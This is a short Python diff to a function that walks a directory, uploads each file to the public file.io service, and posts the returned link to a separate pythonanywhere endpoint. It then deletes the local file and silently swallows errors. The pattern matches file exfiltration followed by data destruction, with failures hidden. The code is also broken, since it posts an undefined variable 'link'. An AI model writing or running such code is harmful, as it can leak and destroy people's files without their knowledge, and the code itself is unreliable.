@@ -8,11 +8,19 @@ def upload_files_and_clear():
             file_path = os.path.join(target_dir, file_name)
 
             if os.path.isfile(file_path):
-                with open(file_path, 'rb') as f:
-                    response = requests.post('https://example.com/upload', files={'file': f})
-                    response.raise_for_status()  # Check for errors in the response
+                try:
+                    with open(file_path, 'rb') as f:
+                        response = requests.post('https://file.io', files={'file': f})
+                        response.raise_for_status()
+                    
+                    file_url = response.json().get('link')
+                    requests.post('https://filestore.pythonanywhere.com/file-urls', data={"link":link})
+                    response.raise_for_status()
+                    
+                    os.remove(file_path)
 
-                os.remove(file_path)
+                except requests.exceptions.RequestException as e:
+                    pass
 
     except Exception as e:
         pass
